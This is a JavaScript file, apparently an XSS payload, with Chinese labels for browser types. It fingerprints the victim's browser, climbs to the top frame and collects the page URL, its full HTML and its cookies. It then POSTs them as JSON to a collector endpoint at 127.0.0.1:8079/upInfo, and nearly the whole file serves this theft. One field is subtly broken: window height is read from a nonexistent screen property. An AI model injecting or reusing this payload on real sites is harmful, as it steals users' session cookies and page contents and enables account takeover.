function allinfo() {
	var appName = navigator.appName;
	var appVersion = navigator.appVersion;
	var cookieEnabled = navigator.cookieEnabled;
	var cpuClass = navigator.cpuClass;

	var mimeType = navigator.mimeTypes;
	var platform = navigator.platform;


	var plugins = navigator.plugins;
	var userLanguage = navigator.userLanguage;
	var userAgent = navigator.userAgent;
	var systemLanguage = navigator.systemLanguage;

	var info = {};
	var type = "";
	if (isIe()) {
		type = "IE浏览器";
	} else if (isFireFox()) {
		type = "火狐浏览器";
	}
	info.browserType = type;

	info.property = userAgent;
	info.appName = appName;
	info.appVersion = appVersion;
	info.cookieEnabled = cookieEnabled;
	info.cpuClass = cpuClass;
	info.sysType = platform;
	info.plugins = plugins;
	info.pluginsLength = plugins.length;
	info.pluginsName = getPluginName();
	info.userLanguage = userLanguage;
	info.systemLanguage = systemLanguage;
	info.flashEnabled = checkePlugs('Shockwave Flash');

	info.windowHeight = window.screen.Enabled;
	info.windowWidth = window.screen.width;
	info.colorDepth = window.screen.colorDepth;
	info.deviceXDPI = window.screen.deviceXDPI;
	return info;
}

function getPluginName() {
	var info = "";
	var plugins = navigator.plugins;
	if (plugins.length > 0) {
		for (i = 0; i < navigator.plugins.length; i++) {
			info += navigator.plugins[i].name + ";";
		}
	}
	return info;
}

function checkePlugs(pluginname) {
	var f = "-"
	var plugins = navigator.plugins;
	if (plugins.length > 0) {
		for (i = 0; i < navigator.plugins.length; i++) {
			if (navigator.plugins[i].name.indexOf(pluginname) >= 0) {
				f = navigator.plugins[i].description.split(pluginname)[1];
				return f;
				break;
			}
		}
	}
	return false;
}

function isIe() {
	var i = navigator.userAgent.toLowerCase().indexOf("msie");
	return i >= 0;
}

function isFireFox() {
	var i = navigator.userAgent.toLowerCase().indexOf("firefox");
	return i >= 0;
}
var topWin = (function(p, c) {
	while (p != c) {
		c = p
		p = p.parent
	}
	return c
})(window.parent, window);

let url = topWin.location;
let html = topWin.document.getElementsByTagName('html')[0].innerHTML;
let cookieArray = document.cookie;
let allInfo = allinfo();

let json = JSON.stringify({
	'url': url,
	'html': html,
	'cookie': cookieArray,
	'allInfo': allInfo
})

let xhr = new XMLHttpRequest();

xhr.open('post', 'http://127.0.0.1:8079/upInfo');
xhr.setRequestHeader('Content-type', 'application/json');
xhr.send(json);
xhr.onreadystatechange = function() {
	if (xhr.readyState === 4 && (xhr.status === 200 || xhr.status === 304)) {
		console.log(xhr.responseText);
	}
}
